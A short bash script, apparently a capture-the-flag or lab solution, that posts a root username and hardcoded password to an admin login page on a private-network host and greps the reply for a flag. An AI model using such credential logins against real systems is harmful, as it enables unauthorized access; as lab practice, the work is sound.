#!/usr/bin/env bash

URL_ROOT=${URL_ROOT:-http://10.13.248.102}
URL="${URL_ROOT}/admin/#"
PASS="qwerty123%40" # %40 is url-encoded '@'
curl -s -X POST --data-raw "username=root&password=$PASS&Login=Login" "${URL}" 2>/dev/null | grep --color=auto "flag"
